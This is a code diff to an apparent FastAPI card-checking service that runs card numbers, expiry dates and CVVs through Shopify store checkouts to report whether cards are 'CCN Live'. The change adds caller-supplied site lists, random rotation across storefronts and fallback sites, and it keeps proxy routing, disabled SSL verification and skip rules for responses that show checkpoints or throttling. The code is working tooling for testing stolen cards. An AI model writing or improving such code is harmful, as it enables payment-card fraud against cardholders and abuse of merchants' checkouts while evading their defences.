@@ -89,6 +89,7 @@ class CheckRequest(BaseModel):
     yy: str
     cvv: str
     site: str = None
+    sites: list = None
     proxy: str = None
 
 
@@ -565,7 +566,7 @@ async def _shopify_check(session, domain, cc, mm, yy, cvv):
     return running_total, f"CCN Live - {code or 'Declined by Bank'}", gw_name, {'amount': running_total}
 
 
-async def check_card(cc, mm, yy, cvv, site=None, proxy=None):
+async def check_card(cc, mm, yy, cvv, site=None, sites=None, proxy=None):
     start = time.time()
     card_short = f"{cc[:6]}xx{cc[-4:]}"
 
@@ -584,15 +585,17 @@ async def check_card(cc, mm, yy, cvv, site=None, proxy=None):
     requested_site = site.replace("https://", "").replace("http://", "").rstrip("/") if site else None
 
     if requested_site:
-        sites = [requested_site]
+        sites_to_try = [requested_site]
+    elif sites:
+        cleaned = [s.replace("https://", "").replace("http://", "").rstrip("/") for s in sites if s]
+        random.shuffle(cleaned)
+        sites_to_try = cleaned[:15]
     else:
-        sites = []
-    
-    fallback_sites = SHOPIFY_SITES.copy()
-    random.shuffle(fallback_sites)
-    sites.extend(fallback_sites[:10])
+        fallback = SHOPIFY_SITES.copy()
+        random.shuffle(fallback)
+        sites_to_try = fallback[:10]
 
-    for s in sites:
+    for s in sites_to_try:
         logger.info(f"Checking {card_short} on {s} proxy={proxy_url is not None}")
         try:
             kw = {"timeout": aiohttp.ClientTimeout(total=20), "connector": aiohttp.TCPConnector(ssl=False, limit=0)}
@@ -620,6 +623,39 @@ async def check_card(cc, mm, yy, cvv, site=None, proxy=None):
             logger.info(f"ERROR {s}: {str(e)[:80]}")
             continue
 
+    if sites_to_try and not requested_site:
+        fallback = SHOPIFY_SITES.copy()
+        random.shuffle(fallback)
+        for s in fallback[:8]:
+            if s in sites_to_try:
+                continue
+            logger.info(f"Fallback checking {card_short} on {s} proxy={proxy_url is not None}")
+            try:
+                kw = {"timeout": aiohttp.ClientTimeout(total=20), "connector": aiohttp.TCPConnector(ssl=False, limit=0)}
+                if proxy_url:
+                    kw["proxy"] = proxy_url
+                async with aiohttp.ClientSession(**kw) as session:
+                    result = await asyncio.wait_for(_shopify_check(session, s, cc, mm, yy, cvv), timeout=25)
+                    amount, response, gw_name = result[0], result[1], result[2]
+                    extra = result[3] if len(result) > 3 else None
+                    elapsed = round(time.time() - start, 2)
+
+                    skip = ["No products", "No session", "No shipping", "Checkpoint", "login", "password", "Throttled", "Gateway Error", "Negotiation", "Processing error", "No receipt", "Invalid card"]
+                    if any(k.lower() in (response or "").lower() for k in skip):
+                        logger.info(f"SKIP {s}: {response}")
+                        continue
+
+                    if _is_fake_gateway(gw_name):
+                        continue
+
+                    return {"status": "ok", "response": response, "gateway": gw_name, "amount": amount, "site": s, "elapsed": elapsed}
+            except asyncio.TimeoutError:
+                logger.info(f"TIMEOUT {s}")
+                continue
+            except Exception as e:
+                logger.info(f"ERROR {s}: {str(e)[:80]}")
+                continue
+
     elapsed = round(time.time() - start, 2)
     return {"status": "error", "response": "All sites failed", "gateway": "Shopify Payments", "amount": None, "site": None, "elapsed": elapsed}
 
@@ -638,7 +674,7 @@ async def check(req: CheckRequest):
         req.yy = req.yy[2:]
     req.mm = req.mm.zfill(2)
     
-    result = await check_card(req.cc, req.mm, req.yy, req.cvv, site=req.site, proxy=req.proxy)
+    result = await check_card(req.cc, req.mm, req.yy, req.cvv, site=req.site, sites=req.sites, proxy=req.proxy)
     return result
 
 @app.get("/sites")
